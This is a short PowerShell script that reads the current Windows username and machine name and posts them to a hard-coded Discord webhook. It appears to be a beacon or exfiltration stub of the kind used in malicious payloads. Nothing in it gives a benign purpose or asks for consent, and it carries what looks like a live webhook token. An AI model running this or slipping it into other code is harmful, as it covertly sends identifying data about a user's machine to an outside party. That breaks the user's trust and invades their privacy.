$webhookUrl="https://discord.com/api/webhooks/1209454835729047562/AOYgRWEOfiiHBaPdfvn9hsdBDDgbnM27U89728F1BSzeBRfGEjxASbT4tfNFoh9hljzs";
try {
    $u = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name;
    $deviceName = [System.Environment]::MachineName;
    $msg = @{
        content = "**System Information:**`n- Username: $u`n- Device Name: $deviceName"
    } | ConvertTo-Json;
    irm -Uri $webhookUrl -Method Post -Body $msg -ContentType "application/json"
} catch {
    Write-Output "Error: $_"
}
